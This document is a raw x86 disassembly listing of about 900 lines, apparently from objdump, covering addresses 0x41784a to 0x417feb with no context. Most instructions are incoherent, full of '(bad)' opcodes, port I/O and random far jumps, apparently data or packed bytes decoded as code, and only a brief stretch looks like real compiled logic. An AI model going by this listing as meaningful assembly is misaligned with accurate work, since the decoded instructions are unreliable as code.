  41784a:	les    eax,FWORD PTR [ebp-0x49978d98]
  417850:	cmp    al,0xe0
  417852:	aas    
  417853:	and    al,0x37
  417855:	ret    0xa68b
  417858:	jno    0x4177dc
  41785a:	rol    al,0x11
  41785d:	test   edi,eax
  41785f:	icebp  
  417860:	and    DWORD PTR [ebp-0xe],eax
  417863:	xor    eax,0x78e90eb6
  417868:	test   DWORD PTR [ebp+0x59],esp
  41786b:	cmp    al,BYTE PTR [ebx+0x6a3ad44a]
  417871:	out    dx,eax
  417872:	and    esi,ecx
  417874:	ret    
  417875:	pop    esp
  417876:	outs   dx,BYTE PTR ds:[esi]
  417877:	or     eax,0x643c30a7
  41787c:	xchg   ebx,eax
  41787d:	dec    DWORD PTR [edx+0x27]
  417880:	lds    ecx,FWORD PTR [eax]
  417882:	aam    0x90
  417884:	fxch   st(2)
  417886:	in     al,dx
  417887:	xor    al,dh
  417889:	fs inc ebp
  41788b:	es std 
  41788d:	fiadd  DWORD PTR [ebx+0x109433ae]
  417893:	sub    eax,0x49853744
  417898:	adc    dh,BYTE PTR [esp+ebp*2]
  41789b:	push   ds
  41789c:	jo     0x4178c2
  41789e:	xor    ch,BYTE PTR [edx]
  4178a0:	ds and eax,0xd0a6acce
  4178a6:	loop   0x4178a0
  4178a8:	jmp    0x7396bf77
  4178ad:	xor    esp,eax
  4178af:	jp     0x417913
  4178b1:	jnp    0x41790f
  4178b3:	inc    eax
  4178b4:	pop    ss
  4178b5:	sbb    DWORD PTR [ebp+0x40],ebx
  4178b8:	mov    esp,0xe6f9a300
  4178bd:	jp     0x417881
  4178bf:	cmp    ebp,DWORD PTR [ecx-0x25]
  4178c2:	sbb    dl,dh
  4178c4:	inc    eax
  4178c5:	aad    0x8e
  4178c7:	adc    BYTE PTR [esi],0x92
  4178ca:	fcmovnu st,st(7)
  4178cc:	pusha  
  4178cd:	por    mm4,QWORD PTR [ebx]
  4178d0:	jge    0x4178af
  4178d2:	inc    eax
  4178d3:	adc    DWORD PTR [eax],eax
  4178d5:	xchg   dh,cl
  4178d7:	es xchg edi,eax
  4178d9:	retf   
  4178da:	lods   eax,DWORD PTR ds:[esi]
  4178db:	test   DWORD PTR [eax],ebp
  4178dd:	push   ebx
  4178de:	mov    bl,BYTE PTR [esi-0x54]
  4178e1:	lods   eax,DWORD PTR ds:[esi]
  4178e2:	sbb    BYTE PTR [edx+eax*2-0x3655d0ce],cl
  4178e9:	pop    ebp
  4178ea:	add    esp,DWORD PTR [eax+0x61]
  4178ed:	int    0x43
  4178ef:	mov    ds:0x1ca3a32c,eax
  4178f4:	fadd   QWORD PTR [edx-0xff39240]
  4178fa:	lods   eax,DWORD PTR ds:[esi]
  4178fb:	pop    ecx
  4178fc:	xlat   BYTE PTR ds:[ebx]
  4178fd:	add    bh,BYTE PTR [eax-0x29]
  417900:	test   DWORD PTR [eax+eiz*8],ecx
  417903:	jl     0x4178df
  417905:	mov    bh,0x2f
  417907:	out    0x81,al
  417909:	adc    DWORD PTR [edx+edi*1-0x680db690],ebx
  417910:	adc    eax,DWORD PTR [eax+0x25]
  417913:	in     al,0xc9
  417915:	ds pop ebp
  417917:	mov    BYTE PTR [edx],ch
  417919:	mov    eax,0xb4436a63
  41791e:	pop    ds
  41791f:	(bad)  
  417920:	push   eax
  417921:	jb     0x4178fa
  417923:	xor    ch,al
  417925:	into   
  417926:	std    
  417927:	cmp    DWORD PTR [edi+edi*8-0x1d57461d],ebx
  41792e:	mov    BYTE PTR [edx],dh
  417930:	es inc edx
  417932:	dec    esi
  417933:	inc    ebp
  417934:	cmp    bh,dl
  417936:	retf   0x4711
  417939:	retf   0x7b84
  41793c:	retf   
  41793d:	out    0x63,al
  41793f:	scas   eax,DWORD PTR es:[edi]
  417940:	pop    esp
  417941:	iret   
  417942:	push   ds
  417943:	js     0x417906
  417945:	dec    ebp
  417946:	pop    DWORD PTR [esi-0x5a]
  417949:	lods   al,BYTE PTR ds:[esi]
  41794a:	ror    BYTE PTR [esi],1
  41794c:	jmp    0x41797c
  41794e:	jo     0x417993
  417950:	mov    edi,0x6bba17e2
  417955:	ds mov bl,0x57
  417958:	mov    eax,0x2eb3734e
  41795d:	adc    esi,DWORD PTR [esi+0x7ed21e98]
  417963:	cmp    ebx,DWORD PTR [ebp+0x69]
  417966:	add    ebx,edi
  417968:	or     cl,BYTE PTR [esi+0x7b]
  41796b:	jecxz  0x41793e
  41796d:	cmp    DWORD PTR [ebp+0x5440bfbe],ecx
  417973:	xor    ch,BYTE PTR [esi]
  417975:	mov    edx,ecx
  417977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417978:	sbb    dh,bl
  41797a:	xchg   esi,eax
  41797b:	sub    BYTE PTR [eax+0x21b94c03],cl
  417981:	stos   DWORD PTR es:[edi],eax
  417982:	add    ebp,DWORD PTR [ebx+0x75]
  417985:	ins    BYTE PTR es:[edi],dx
  417986:	mov    eax,0x1ca4a4c5
  41798b:	addr16 nop
  41798d:	inc    eax
  41798e:	mov    ds:0x63f17bdc,al
  417993:	inc    eax
  417994:	pop    ebp
  417995:	aam    0x9d
  417997:	and    BYTE PTR [eax+eiz*4],0xa3
  41799b:	int    0x4a
  41799d:	mov    esi,0x1afb3d82
  4179a2:	arpl   WORD PTR [esi-0x3c],ax
  4179a5:	pop    edi
  4179a6:	xor    al,0xa
  4179a8:	repnz add al,0x19
  4179ab:	mov    esi,0xc125a92c
  4179b0:	jo     0x4179b8
  4179b2:	pop    edx
  4179b3:	pop    ds
  4179b4:	push   esi
  4179b5:	sbb    BYTE PTR [eax],ah
  4179b7:	or     bh,dh
  4179b9:	jg     0x4179a3
  4179bb:	pop    ebp
  4179bc:	push   es
  4179bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179be:	adc    edi,ebx
  4179c0:	adc    BYTE PTR [ebx],cl
  4179c2:	in     al,0x2e
  4179c4:	ja     0x417a23
  4179c6:	sbb    esp,DWORD PTR [esi]
  4179c8:	mov    dl,BYTE PTR [esi]
  4179ca:	inc    eax
  4179cb:	push   cs
  4179cc:	ret    0xf851
  4179cf:	add    BYTE PTR [eax-0x40a863c3],dl
  4179d5:	push   edx
  4179d6:	push   ds
  4179d7:	cmp    edi,esp
  4179d9:	sti    
  4179da:	add    al,0xe2
  4179dc:	sbb    dl,bl
  4179de:	mov    BYTE PTR [esi+0x45637008],cl
  4179e4:	iret   
  4179e5:	enter  0xe7ff,0x14
  4179e9:	cmp    al,0xc0
  4179eb:	dec    esp
  4179ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179ed:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4179ef:	outs   dx,BYTE PTR ds:[esi]
  4179f0:	inc    edi
  4179f1:	inc    esi
  4179f2:	fst    QWORD PTR [ebx+0x62]
  4179f5:	scas   eax,DWORD PTR es:[edi]
  4179f6:	adc    cl,BYTE PTR [ebp-0x1a]
  4179f9:	aaa    
  4179fa:	and    esp,0x5
  4179fd:	jmp    0x6aae:0xd55ee153
  417a04:	pop    ebp
  417a05:	or     eax,eax
  417a07:	sub    ecx,eax
  417a09:	mov    eax,0x4e40099d
  417a0e:	cs retf 0xf5e4
  417a12:	sbb    bh,al
  417a14:	and    ecx,DWORD PTR ds:0x773d539c
  417a1a:	mov    cl,dl
  417a1c:	mov    esi,0x79ef5bdc
  417a21:	or     dh,bh
  417a23:	dec    edi
  417a24:	xchg   BYTE PTR [edx+0x33a29464],ah
  417a2a:	cdq    
  417a2b:	int3   
  417a2c:	ins    BYTE PTR es:[edi],dx
  417a2d:	push   ecx
  417a2e:	fisttp WORD PTR [edi-0x4bf68562]
  417a34:	inc    esp
  417a35:	pop    esi
  417a36:	mov    bh,0xdd
  417a38:	and    BYTE PTR [esi+0x1b],bl
  417a3b:	add    BYTE PTR [bx+si-0xe0b],ah
  417a40:	in     eax,0xd5
  417a42:	mov    DWORD PTR [esi-0x669e74a],esp
  417a48:	add    ecx,DWORD PTR [ebp+0x6a2df85d]
  417a4e:	xchg   ebp,eax
  417a4f:	ja     0x417a0d
  417a51:	sbb    BYTE PTR [eax-0x8],bh
  417a54:	mov    ds:0x941249c,eax
  417a59:	sahf   
  417a5a:	(bad)  
  417a5b:	push   esp
  417a5c:	(bad)  
  417a5d:	mov    BYTE PTR [ebp+0x4b8e9b3b],al
  417a63:	sub    al,0xea
  417a65:	mov    DWORD PTR [edi],ebp
  417a67:	dec    edx
  417a68:	js     0x417a3a
  417a6a:	push   0xffffffc1
  417a6c:	in     al,0xc2
  417a6e:	and    BYTE PTR [ebx-0x39],ch
  417a71:	sbb    ah,cl
  417a73:	add    esi,DWORD PTR [ebx+0x33]
  417a76:	loop   0x417a43
  417a78:	cmp    eax,0x9229d1b
  417a7d:	dec    esi
  417a7e:	popa   
  417a7f:	js     0x417a9e
  417a81:	fbstp  TBYTE PTR ds:0x83b5c40d
  417a87:	or     cl,BYTE PTR [eax+ebx*4]
  417a8a:	cli    
  417a8b:	mov    bh,0x80
  417a8d:	add    DWORD PTR [ecx-0x7363a2eb],ebp
  417a93:	mov    al,ds:0xc3996817
  417a98:	js     0x417ac7
  417a9a:	jae    0x417ab8
  417a9c:	(bad)  
  417a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a9e:	pushf  
  417a9f:	or     edi,esp
  417aa1:	mov    ecx,0xa1687844
  417aa6:	xchg   ecx,eax
  417aa7:	push   0x72bb3256
  417aac:	pop    eax
  417aad:	mov    ds:0xa69dc44,eax
  417ab2:	xor    DWORD PTR [ebx-0x8],ebp
  417ab5:	retf   
  417ab6:	adc    BYTE PTR [ebp+0x26022afa],bh
  417abc:	push   esp
  417abd:	cdq    
  417abe:	inc    edx
  417abf:	sub    ch,cl
  417ac1:	xor    esi,ebp
  417ac3:	mov    WORD PTR [esi],fs
  417ac5:	(bad)  
  417ac7:	fiadd  WORD PTR ds:0x55c76611
  417acd:	jmp    0xf709:0xf01e9046
  417ad4:	xor    eax,0xa8854708
  417ad9:	das    
  417ada:	cmp    bl,BYTE PTR [eax]
  417adc:	cwde   
  417add:	sbb    dl,BYTE PTR [edx+0x61c28cd2]
  417ae3:	ror    BYTE PTR [ebp-0x27],0x76
  417ae7:	in     al,dx
  417ae8:	fmul   DWORD PTR [ecx-0x62]
  417aeb:	lods   eax,DWORD PTR ds:[esi]
  417aed:	jb     0x417af2
  417aef:	push   ds
  417af0:	retf   
  417af1:	es out dx,eax
  417af3:	loope  0x417aa1
  417af5:	lahf   
  417af6:	das    
  417af7:	ja     0x417abe
  417af9:	or     bl,BYTE PTR [edx]
  417afb:	shl    DWORD PTR [esi+edx*2],1
  417afe:	fisttp QWORD PTR [ebp-0x25]
  417b01:	add    DWORD PTR [ecx+esi*2+0x6],ebp
  417b05:	mov    edi,0x5df34d1f
  417b0a:	loopne 0x417a8f
  417b0c:	add    al,0x33
  417b0e:	stos   DWORD PTR es:[edi],eax
  417b0f:	push   es
  417b10:	dec    esi
  417b11:	in     eax,dx
  417b12:	mov    ah,0xeb
  417b14:	jle    0x417abd
  417b16:	jb     0x417b3f
  417b18:	xor    al,0xf3
  417b1a:	push   ecx
  417b1b:	aas    
  417b1c:	cmp    ebp,ebp
  417b1e:	(bad)  
  417b1f:	push   cs
  417b20:	scas   al,BYTE PTR es:[edi]
  417b21:	aas    
  417b22:	cmp    eax,0x1ad7b0de
  417b27:	cwde   
  417b28:	xor    eax,ecx
  417b2a:	mov    ch,0x70
  417b2c:	hlt    
  417b2d:	aaa    
  417b2e:	cmp    esi,DWORD PTR [ecx+0x677ec15]
  417b34:	mov    ds:0x46e5bc34,eax
  417b39:	sar    dh,cl
  417b3b:	or     ebp,DWORD PTR [ebx]
  417b3d:	mov    dh,BYTE PTR es:[esi]
  417b40:	mov    ch,0xdc
  417b42:	in     eax,dx
  417b43:	stos   DWORD PTR es:[edi],eax
  417b44:	aaa    
  417b45:	push   esi
  417b46:	lahf   
  417b47:	inc    ebx
  417b48:	rcl    DWORD PTR [ebp+0x3f],0x37
  417b4c:	(bad)  
  417b4d:	rcr    DWORD PTR [eax+0x7d],1
  417b50:	or     eax,DWORD PTR [ebx-0x20db55a1]
  417b56:	rcl    BYTE PTR [esi-0x6ad15885],1
  417b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b5d:	push   edx
  417b5e:	and    al,al
  417b60:	mov    ds:0xa5c19a6e,al
  417b65:	sar    esi,0x77
  417b68:	shl    edx,cl
  417b6a:	jo     0x417b2e
  417b6c:	test   BYTE PTR [ebp+0x26736d2],0xa3
  417b73:	push   es
  417b74:	js     0x417b39
  417b76:	jne    0x417b0e
  417b78:	rol    eax,1
  417b7a:	fwait
  417b7b:	hlt    
  417b7c:	xlat   BYTE PTR ds:[ebx]
  417b7d:	sbb    al,0x7a
  417b7f:	xor    al,0xc5
  417b81:	xor    DWORD PTR [esi],edx
  417b83:	lahf   
  417b84:	dec    eax
  417b85:	adc    BYTE PTR [ecx],ch
  417b87:	or     bh,BYTE PTR [ebx-0x3cb408cb]
  417b8d:	mov    dl,0xb9
  417b8f:	ficom  DWORD PTR [edx+0x4e]
  417b92:	ins    BYTE PTR es:[edi],dx
  417b93:	mov    BYTE PTR ds:0xdc136ef4,cl
  417b99:	(bad)  
  417b9a:	xor    bl,dl
  417b9c:	es in  eax,0x50
  417b9f:	dec    eax
  417ba0:	add    al,0xa0
  417ba2:	adc    eax,0x1395e5a5
  417ba7:	leave  
  417ba8:	cwde   
  417ba9:	mov    dl,0x22
  417bab:	inc    eax
  417bac:	in     al,dx
  417bad:	ss test ah,dh
  417bb0:	jb     0x417b7e
  417bb2:	ja     0x417ba9
  417bb4:	xchg   BYTE PTR [eax],bl
  417bb6:	xlat   BYTE PTR ds:[ebx]
  417bb7:	pop    esp
  417bb8:	inc    eax
  417bb9:	mov    ecx,0xbeacae5b
  417bbe:	stos   DWORD PTR es:[edi],eax
  417bbf:	test   DWORD PTR [esi+ebp*4],0xa08bbf2b
  417bc6:	test   eax,0x94e6ca5a
  417bcb:	pushf  
  417bcc:	cmp    DWORD PTR [edi+edi*2-0x671842b3],0xe03215a5
  417bd7:	fistp  DWORD PTR [ebp-0x7f]
  417bda:	xchg   edx,eax
  417bdb:	sbb    bh,ch
  417bdd:	outs   dx,BYTE PTR ds:[esi]
  417bde:	and    ebp,DWORD PTR [esi+0x85da6e0]
  417be4:	cmp    DWORD PTR [eax-0x68],0xfffffff4
  417be8:	mov    al,0x59
  417bea:	push   edx
  417beb:	inc    edi
  417bec:	aad    0x57
  417bee:	jmp    0x417c42
  417bf0:	test   DWORD PTR [edx+0x1d],edi
  417bf3:	out    0xba,al
  417bf5:	xchg   ebp,eax
  417bf6:	and    BYTE PTR [ebx-0x3e],dh
  417bf9:	into   
  417bfa:	mov    esp,edi
  417bfc:	jl     0x417c17
  417bfe:	push   ss
  417bff:	dec    esi
  417c00:	add    al,0x6f
  417c02:	popa   
  417c03:	fld    TBYTE PTR [ebp-0x6a64a09f]
  417c09:	mov    cl,0xb8
  417c0b:	imul   edi,DWORD PTR ds:0xbbef77d1,0x17ea3cbe
  417c15:	sub    BYTE PTR [edi+ebx*4-0x11798c80],ah
  417c1c:	shl    DWORD PTR [ecx-0x3d],0xb1
  417c20:	xor    ebx,ebp
  417c22:	push   ebx
  417c23:	cmp    DWORD PTR [eax-0x58a358e9],0xffffff8b
  417c2a:	xchg   esp,eax
  417c2b:	mov    al,0xb
  417c2d:	adc    DWORD PTR [edx+0x5558b95a],eax
  417c33:	mov    esp,0xfabbb9dc
  417c38:	(bad)
  417c3c:	cmp    ch,BYTE PTR [edi]
  417c3e:	sbb    DWORD PTR [edx+0x4],eax
  417c41:	cli    
  417c42:	jle    0x417c6e
  417c44:	test   eax,0x33f3d349
  417c49:	into   
  417c4a:	jecxz  0x417bd6
  417c4c:	shl    BYTE PTR [edx+edx*1],1
  417c4f:	mov    BYTE PTR [ecx+eax*2-0x1c9ef615],cl
  417c56:	hlt    
  417c57:	ins    BYTE PTR es:[edi],dx
  417c58:	dec    ebp
  417c59:	push   cs
  417c5a:	jle    0x417c1c
  417c5c:	imul   esi,DWORD PTR [ebx-0x1a],0x62
  417c60:	enter  0xa45,0x8e
  417c64:	je     0x417c62
  417c66:	(bad)
  417c69:	imul   eax,DWORD PTR [ecx],0xffffffbf
  417c6c:	sub    ch,BYTE PTR [eax+0x20c28ace]
  417c72:	pop    esp
  417c73:	pop    esp
  417c74:	je     0x417ccc
  417c76:	mov    ds:0x9f06561b,al
  417c7b:	(bad)  
  417c7c:	clc    
  417c7d:	inc    esi
  417c7e:	pop    ebp
  417c7f:	fisub  WORD PTR [edi]
  417c81:	mov    WORD PTR [ebp-0x4b5b1860],es
  417c87:	or     bh,BYTE PTR [esi-0x53]
  417c8a:	xor    DWORD PTR [ecx],esp
  417c8c:	mov    ebp,cs
  417c8e:	jge    0x417d07
  417c90:	(bad)  
  417c91:	neg    BYTE PTR [esi+0x23]
  417c94:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c96:	arpl   bx,sp
  417c98:	daa    
  417c99:	mov    DWORD PTR [ebx-0x32c2231e],ecx
  417c9f:	push   eax
  417ca0:	and    ebx,DWORD PTR [edi]
  417ca2:	rol    dl,0xda
  417ca5:	dec    edi
  417ca6:	aam    0x65
  417ca8:	fidivr DWORD PTR [ebx]
  417caa:	xor    ebx,DWORD PTR [edx-0x4a68db28]
  417cb0:	out    0x6d,al
  417cb2:	mov    cl,0xb4
  417cb4:	jg     0x417c99
  417cb6:	xchg   BYTE PTR [ecx-0x4f],ah
  417cb9:	xchg   esp,eax
  417cba:	add    ecx,DWORD PTR [ebx-0x2e]
  417cbd:	push   0x7d
  417cbf:	(bad)  
  417cc0:	icebp  
  417cc1:	fisubr DWORD PTR [edx]
  417cc3:	(bad)  
  417cc4:	mov    edx,0xfbd0f005
  417cc9:	adc    ah,cl
  417ccb:	(bad)  
  417ccc:	sub    bl,BYTE PTR [edx+ecx*8+0x300e6814]
  417cd3:	mov    edi,cs
  417cd5:	icebp  
  417cd6:	je     0x417c70
  417cd8:	mov    eax,ds:0xa6bc24d7
  417cdd:	ins    DWORD PTR es:[edi],dx
  417cde:	(bad)  
  417cdf:	iret   
  417ce0:	add    eax,0x6a43dcbc
  417ce5:	adc    eax,0xa81ebd1e
  417cea:	mov    BYTE PTR [edi+0x69e64c68],bl
  417cf0:	push   edx
  417cf1:	mov    ss,WORD PTR [edi]
  417cf3:	or     al,0xb9
  417cf5:	(bad)  
  417cf6:	push   esi
  417cf7:	cmc    
  417cf8:	pmulhuw mm4,mm5
  417cfb:	push   ecx
  417cfc:	mov    ch,0xab
  417cfe:	mov    edx,0xcd46b1a6
  417d03:	adc    al,0xa4
  417d05:	mov    ebx,0x3f2a72a8
  417d0a:	fs xchg esp,eax
  417d0c:	inc    ebx
  417d0d:	stos   BYTE PTR es:[edi],al
  417d0e:	add    eax,0x45b62520
  417d13:	test   dl,bh
  417d15:	fidiv  DWORD PTR [edx+0x33]
  417d18:	push   ecx
  417d19:	lods   al,BYTE PTR ds:[esi]
  417d1a:	sbb    al,BYTE PTR [ecx+0x6b]
  417d1d:	in     al,0x29
  417d1f:	pop    ebp
  417d20:	sar    DWORD PTR [edx],1
  417d22:	mov    ch,0x91
  417d24:	and    al,0xca
  417d26:	popa   
  417d27:	inc    esi
  417d28:	sbb    DWORD PTR [ecx-0x57b0cc0f],0x75086592
  417d32:	sub    bh,dl
  417d34:	mov    esi,0x287f67ce
  417d39:	sbb    ebp,DWORD PTR [edi+eiz*4]
  417d3c:	push   0x78
  417d3e:	mov    edi,0x24879085
  417d43:	cmp    DWORD PTR [esi+0x64842377],eax
  417d49:	inc    edx
  417d4a:	pop    edi
  417d4b:	mov    bl,BYTE PTR [edi]
  417d4d:	mov    ds:0xb720a23f,eax
  417d52:	frstor [eax]
  417d54:	je     0x417ce5
  417d56:	shl    BYTE PTR [edx-0x4f235349],cl
  417d5c:	mov    ds:0x46c67eed,al
  417d61:	xor    ch,BYTE PTR [ebp-0x7536e3c]
  417d67:	mov    bl,0x10
  417d69:	cld    
  417d6a:	sub    eax,0x56101431
  417d6f:	arpl   WORD PTR [ebx+ecx*8+0x0],sp
  417d73:	jmp    0x76db:0xa51f96b9
  417d7a:	js     0x417d5d
  417d7c:	pop    ebx
  417d7d:	into   
  417d7e:	jecxz  0x417dad
  417d80:	or     al,0xec
  417d82:	push   es
  417d83:	xchg   edi,eax
  417d84:	ins    DWORD PTR es:[edi],dx
  417d85:	sub    DWORD PTR [edx+0x749fe9f4],eax
  417d8b:	xlat   BYTE PTR ds:[ebx]
  417d8c:	jmp    0xaf6c663a
  417d91:	jns    0x417e0a
  417d93:	mov    BYTE PTR [edx],dl
  417d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d96:	jne    0x417da7
  417d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d99:	lock (bad) 
  417d9b:	sbb    BYTE PTR [ecx],bh
  417d9d:	stos   BYTE PTR es:[edi],al
  417d9e:	push   ebp
  417d9f:	jmp    0x55e4:0x5e975e0c
  417da6:	stos   DWORD PTR es:[edi],eax
  417da7:	or     eax,0xed8fc057
  417dac:	jmp    DWORD PTR [ecx]
  417dae:	sub    BYTE PTR [eax-0x39298c65],dl
  417db4:	mov    BYTE PTR [eax],0x6b
  417db7:	sub    eax,0x81cc8455
  417dbc:	adc    eax,0xe28a3259
  417dc1:	(bad)  
  417dc2:	hlt    
  417dc3:	jge    0x417e39
  417dc5:	jecxz  0x417d80
  417dc7:	push   ecx
  417dc8:	pop    esp
  417dc9:	ror    ch,1
  417dcb:	jmp    0x7831:0xd34c8a58
  417dd2:	mov    cl,0x0
  417dd4:	cmp    ebp,DWORD PTR cs:[ecx+ebx*2]
  417dd8:	pause  
  417dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ddb:	push   ebx
  417ddc:	enter  0x3e4a,0x52
  417de0:	mov    ds,WORD PTR [edx]
  417de2:	add    BYTE PTR [edx+0xe83f902],0x85
  417de9:	dec    edi
  417dea:	jg     0x417dc5
  417dec:	cmp    eax,0x9940b9ca
  417df1:	cmp    ebp,DWORD PTR [ebp-0x49]
  417df4:	add    DWORD PTR ds:0x55098ab7,esp
  417dfa:	pop    ebp
  417dfb:	out    0x91,eax
  417dfd:	xor    BYTE PTR [ebx+0x38],dh
  417e00:	fabs   
  417e02:	ss cli 
  417e04:	or     ah,BYTE PTR [ebp+0x1afc0149]
  417e0a:	into   
  417e0b:	punpcklbw mm7,DWORD PTR [ebx]
  417e0e:	or     cl,BYTE PTR [ebx+0x65ac56ec]
  417e14:	pop    ebx
  417e15:	mov    edi,0xe9230880
  417e1a:	adc    eax,0x576c743b
  417e1f:	jl     0x417e20
  417e21:	pop    eax
  417e22:	pop    ecx
  417e23:	rcr    cl,0xec
  417e26:	mov    bh,0x2d
  417e28:	aas    
  417e29:	fbld   TBYTE PTR [ecx]
  417e2b:	mov    ecx,DWORD PTR [ebp-0x20]
  417e2e:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	(bad)  
  417e5f:	fldenv fs:0x7a7d38de
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417df3
  417e6b:	mov    DWORD PTR [edi],ebx
  417e6d:	in     eax,0xd0
  417e6f:	pop    es
  417e70:	call   0xc50f9def
  417e75:	mov    ds:0xbb15ae88,eax
  417e7a:	mov    ebx,esp
  417e7c:	and    eax,edx
  417e7e:	adc    eax,0x8a07c12b
  417e83:	xchg   ebx,eax
  417e84:	idiv   ch
  417e86:	pop    esp
  417e87:	stc    
  417e88:	and    ebp,edx
  417e8a:	(bad)  
  417e8b:	fnstcw WORD PTR [edx+0x852d094]
  417e91:	mov    eax,?
  417e93:	jge    0x417e3b
  417e95:	add    DWORD PTR [edx],0xfffffff4
  417e98:	test   eax,0xb4224d82
  417e9d:	scas   al,BYTE PTR es:[edi]
  417e9e:	and    al,0x39
  417ea0:	test   al,bh
  417ea2:	and    DWORD PTR [edi-0x4a],0x60
  417ea6:	pop    ebp
  417ea7:	shl    dh,0xe5
  417eaa:	das    
  417eab:	cs push eax
  417ead:	mov    ah,0xaf
  417eaf:	inc    eax
  417eb0:	imul   edx,DWORD PTR [ecx*4+0x7c7d054a],0xa428d59e
  417ebb:	aaa    
  417ebc:	rcl    BYTE PTR [eax-0x20700bdb],0xd3
  417ec3:	pop    edi
  417ec4:	imul   DWORD PTR [ebp-0x7f]
  417ec7:	daa    
  417ec8:	xor    al,0x13
  417eca:	lods   eax,DWORD PTR ds:[esi]
  417ecb:	popa   
  417ecc:	jne    0x417e7c
  417ece:	cmp    eax,0x3778e906
  417ed3:	add    al,0x6d
  417ed5:	xchg   edi,eax
  417ed6:	hlt    
  417ed7:	jmp    0x287dc7ad
  417edc:	hlt    
  417edd:	test   DWORD PTR [ecx],esp
  417edf:	xchg   esi,eax
  417ee0:	in     eax,dx
  417ee1:	popf   
  417ee2:	and    eax,0xdeaa05fc
  417ee7:	sbb    DWORD PTR [ebx+ebp*4-0x55ea93dc],0x18f8c64c
  417ef2:	and    ebp,DWORD PTR [edi-0x7c]
  417ef5:	rcr    DWORD PTR [ebx],1
  417ef7:	js     0x417f1b
  417ef9:	sbb    eax,0xf06d3229
  417eff:	repnz cmp al,0xbd
  417f02:	aam    0xbf
  417f04:	loope  0x417f03
  417f06:	sub    ebp,DWORD PTR [esi-0x124bf579]
  417f0c:	push   esi
  417f0d:	pop    es
  417f0e:	xchg   esp,eax
  417f0f:	mov    ah,0x7
  417f11:	mov    esp,0xe0d1c8a4
  417f16:	movhps xmm4,QWORD PTR ds:0x68e74ff4
  417f1d:	push   esi
  417f1e:	in     al,0x9d
  417f20:	and    eax,DWORD PTR [esi+0x734df3dc]
  417f26:	jecxz  0x417f0f
  417f28:	cmp    edx,edi
  417f2a:	xor    al,0xba
  417f2c:	leave  
  417f2d:	std    
  417f2e:	jmp    FWORD PTR [eax]
  417f30:	js     0x417f16
  417f32:	ins    BYTE PTR es:[edi],dx
  417f33:	mov    BYTE PTR [ebx],cl
  417f35:	pusha  
  417f36:	mov    edi,0x89b401c1
  417f3b:	fmul   QWORD PTR [ebp+ebx*2+0x783e8192]
  417f42:	pop    eax
  417f43:	xchg   esi,eax
  417f44:	sub    DWORD PTR [ecx+0x22d1c0c7],edx
  417f4a:	jo     0x417f48
  417f4c:	mov    ecx,0xfb5ce619
  417f51:	outs   dx,DWORD PTR ds:[esi]
  417f52:	aas    
  417f53:	je     0x417f89
  417f55:	xlat   BYTE PTR ds:[ebx]
  417f56:	xchg   edi,eax
  417f57:	add    BYTE PTR [edi],cl
  417f59:	mov    dl,0x31
  417f5b:	inc    esi
  417f5c:	scas   al,BYTE PTR es:[edi]
  417f5d:	inc    ebp
  417f5e:	pop    esp
  417f5f:	(bad)  
  417f60:	out    0x89,eax
  417f62:	mov    dl,0x6c
  417f64:	adc    ch,BYTE PTR [edx-0x71a0d2a1]
  417f6a:	out    dx,eax
  417f6b:	scas   al,BYTE PTR es:[edi]
  417f6c:	aaa    
  417f6d:	cmc    
  417f6e:	fdivr  DWORD PTR [eax]
  417f70:	pop    eax
  417f71:	add    esi,DWORD PTR [eax]
  417f73:	out    0x86,al
  417f75:	ror    DWORD PTR [edi+0x6f263fc7],0xe5
  417f7c:	repnz mov bl,0x57
  417f7f:	fcom   QWORD PTR [ecx-0x5d]
  417f83:	ror    BYTE PTR ds:0x7dbeceea,0xf5
  417f8a:	or     DWORD PTR [ebx],edi
  417f8c:	repnz icebp 
  417f8e:	cmc    
  417f8f:	out    0xd0,al
  417f91:	adc    ecx,DWORD PTR [ecx+edx*1+0x15]
  417f95:	adc    dl,ch
  417f97:	jnp    0x417f6d
  417f99:	xchg   BYTE PTR [ecx],bh
  417f9b:	rcl    DWORD PTR [eax+0x3621b56a],1
  417fa1:	lea    eax,[edi+0x4a]
  417fa4:	cmp    BYTE PTR [ebp-0x74],bh
  417fa7:	cld    
  417fa8:	fs nop
  417faa:	pop    ecx
  417fab:	out    0xde,eax
  417fad:	pusha  
  417fae:	shl    BYTE PTR [ebp-0x63],1
  417fb1:	loopne 0x417fd3
  417fb3:	mov    dl,BYTE PTR [eax]
  417fb5:	test   DWORD PTR [eax-0x1d],0xeb636b30
  417fbc:	repz mov ah,0x41
  417fbf:	pop    esi
  417fc0:	mov    dh,0x90
  417fc2:	(bad)  
  417fc3:	repnz dec esi
  417fc5:	sahf   
  417fc6:	out    dx,al
  417fc7:	std    
  417fc8:	mov    edx,0x813484e1
  417fcd:	fistp  DWORD PTR [ebp+0x3d7663c1]
  417fd3:	and    al,ch
  417fd5:	adc    al,0x6f
  417fd7:	add    eax,0xd43a996d
  417fdc:	adc    dh,BYTE PTR [esi]
  417fde:	push   esp
  417fdf:	push   ss
  417fe0:	dec    eax
  417fe1:	sbb    al,0x4d
  417fe3:	push   ebp
  417fe4:	lock mov bl,0x52
  417fe7:	xchg   DWORD PTR [ebx],edx
  417fe9:	loopne 0x418000
  417feb:	push   DWORD PTR [edx]
